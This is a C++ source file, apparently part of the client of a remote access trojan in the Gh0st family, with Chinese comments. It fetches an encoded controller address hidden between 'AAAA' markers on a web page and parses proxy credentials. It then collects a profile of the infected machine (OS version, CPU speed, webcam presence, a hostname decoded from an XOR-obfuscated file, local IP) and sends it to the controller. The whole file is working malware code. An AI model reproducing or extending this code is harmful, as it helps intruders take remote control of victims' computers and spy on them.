
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#include "decode.h"

#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "vfw32.lib")
typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
					char **lppszProxyUser, char **lppszProxyPass)
{
	*lppszHost = NULL;
	*lppPort = 0;
	*lppszProxyHost = NULL;
	*lppProxyPort = 0;
	*lppszProxyUser = NULL;
	*lppszProxyPass = NULL;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlen(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);
	
	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;
	pStart = strchr(lpString, ':');
	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsProxyUsed = true;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);
	
	if (!bIsProxyUsed)
		return;

	pNext++;
	*lppszProxyHost = pNext;

	pStart = strchr(pNext, ':');
	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsAuth = true;
		*pNext = '\0';
	}
	*lppProxyPort = atoi(pStart + 1);
	
	if (!bIsAuth)
		return;
	
	pNext++;
	*lppszProxyUser = pNext;
	pStart = strchr(pNext, ':');
	*pStart = '\0';
	*lppszProxyPass = pStart + 1;
}

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
				  char **lppszProxyUser, char **lppszProxyPass)
{
	if (lpURL == NULL)
		return false;

	char	*pStart, *pEnd;
	char	chBuff[2048];
	char	strEncode[1024];

	DWORD	dwBytesRead = 0;
	bool	bRet = false;

	if (strstr(lpURL, "http://") == NULL && strstr(lpURL, "https://") == NULL)
	{
		SplitLoginInfo(lpURL, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		return true;
	}

	HINTERNET	hNet;
	HINTERNET	hFile;
	hNet = InternetOpen("Internet Explorer 7.0", PRE_CONFIG_INTERNET_ACCESS, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	
	if (hNet == NULL)
		return bRet;
	hFile = InternetOpenUrl(hNet, lpURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL)
		return bRet;
	
	while(1)
	{
		memset(chBuff, 0, sizeof(chBuff));
		if (!(InternetReadFile(hFile, chBuff, sizeof(chBuff), &dwBytesRead) && dwBytesRead != 0))
			break;
		
		if ((pStart = strstr(chBuff, "AAAA")) == NULL) 
			continue;
		pStart += 4;
		if ((pEnd = strstr(pStart, "AAAA")) == NULL)
			continue;

		memset(strEncode, 0, sizeof(strEncode));
		memcpy(strEncode, pStart, pEnd - pStart);
		
		char *lpDecodeString = MyDecode(strEncode);
		SplitLoginInfo(lpDecodeString, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		bRet = true;
		break;
	}
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hNet);
	
	return bRet;
}


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

UINT GetHostID(LPTSTR lpBuffer, UINT uSize)
{
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	char	strIDFile[MAX_PATH];
	GetSystemDirectory(strIDFile, sizeof(strIDFile));
	lstrcat(strIDFile, "\\user.dat");
	HANDLE	hFile = CreateFile(strIDFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE  && (dwSize = GetFileSize(hFile, NULL)) > 0)
	{
		if (dwSize > uSize)
			dwSize = uSize;
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
	}
	// 解下密
	for (int i = 0; i < dwBytesRead; i++)
		lpBuffer[i] ^= 0x90;

	CloseHandle(hFile);

	if (dwBytesRead == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

DWORD WINAPI sendLoginInfo(LPVOID lparam)
{
	int nRet = SOCKET_ERROR;
	CClientSocket *pClient = *((CClientSocket **)lparam);
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostID(hostname, sizeof(hostname));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	memcpy(&LoginInfo.dwSpeed, (char *)lparam + 4, 4);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
